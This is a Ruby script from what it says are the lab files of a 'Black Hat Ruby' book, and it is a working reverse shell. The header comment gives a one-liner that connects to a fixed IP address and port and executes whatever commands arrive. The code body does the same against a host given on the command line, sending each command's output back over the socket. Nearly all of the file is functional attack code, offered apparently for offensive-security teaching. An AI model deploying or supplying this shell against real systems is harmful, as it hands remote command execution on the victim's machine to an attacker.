#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Reverse Shell
#   One-liner:
#   $ ruby -rsocket -e 's=TCPSocket.new("192.168.100.10",9911);while(cmd=s.gets);IO.popen(cmd,"r"){|io|s.print io.read}end'
# Requirements:
#
require 'socket'

host     = ARGV[0] || 'localhost'
port     = ARGV[1] || 9911
hostname = `hostname`.chomp

s = TCPSocket.open(host, port)
begin
  loop do
    s.print "#{hostname})> "
    cmd = s.gets.chomp
    IO.popen(cmd, 'rb', :err=>[:child, :out]) {|io| s.print(io.read)} unless cmd.empty?
  end
rescue Errno::ENOENT
  retry
rescue Exception => e
  puts e.full_message
  exit!
end
 